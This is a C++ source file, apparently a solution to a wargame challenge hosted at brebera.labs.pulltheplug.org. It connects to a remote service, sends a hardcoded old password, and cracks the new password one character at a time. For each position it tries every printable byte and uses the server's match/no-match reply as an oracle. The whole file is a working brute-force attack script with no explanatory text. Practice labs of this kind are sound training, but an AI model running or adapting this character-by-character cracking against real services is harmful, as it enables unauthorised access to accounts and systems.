#include <iostream>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

struct query {
  unsigned char oldpass[20+1];
  unsigned char pass[100+1];
  unsigned int len;
};

struct response {
  unsigned int result;
  unsigned char pass[100+1];
};

int CheckPassword(int,query qry);

int main(int argc, char** argv) {
  time_t startTime=time(NULL);
  sockaddr_in addr;
  int sock;
  hostent* h;
  addr.sin_family=AF_INET;
  addr.sin_port=htons(24019);
  if((h=gethostbyname("brebera.labs.pulltheplug.org"))==NULL) {
    perror("gethostbyname failed.\n");
    exit(1);
  }
  bcopy((char*)h->h_addr,
	(char*)&addr.sin_addr.s_addr,
	h->h_length);
  sock=socket(PF_INET, SOCK_STREAM, 0);
  if(!sock) {
    perror("Failed to create socket.\n");
    exit(1);
  }
  if(connect(sock,(struct sockaddr*) &addr, sizeof(addr)) <0) {
    perror("Failed to connect to remote host.\n");
    exit(1);
  }

  printf("Connected to brebera.labs.pulltheplug.org.\n");
  query qry;
  memset(&qry,'\0',sizeof(query));
  memcpy(qry.oldpass,"mu3sli_muncher",strlen("mu3sli_muncher"));

  char attempt[500];
  memset(attempt,'\0',500);
  for(unsigned int i=0;i<500;i++) {
    qry.len=strlen(attempt)+1;
    time_t charTime=time(NULL);
    for(unsigned int j=32;j<127;j++) {
      qry.pass[strlen(attempt)]=j;
      if(CheckPassword(sock,qry)) {
	attempt[i]=j;
	printf("Cracked char %c in %f seconds (%d so far).\n",j,difftime(time(NULL),charTime),strlen(attempt));
	break;
      }
    }
    if(strlen(attempt)<=i) {
      printf("Password cracked in %d chars (%f seconds)\n[%s]\n",strlen(attempt),difftime(time(NULL),startTime),attempt);
      exit(1);
    }
  }
  return 0;
}


int CheckPassword(int sock,query qry) {
  if(send(sock,&qry,sizeof(query),0)==-1) {
    perror("Failed to send data.\n");
    exit(1);
  }
  response rsp;
  memset(&rsp,'\0',sizeof(response));
  if(recv(sock,&rsp,sizeof(response),0)==0) {//no match
    perror("Server closed connection (oldpass is bad).\n");
    exit(1);
  }
  if(rsp.result!=1)
    return 0;
  else
    return 1;
}


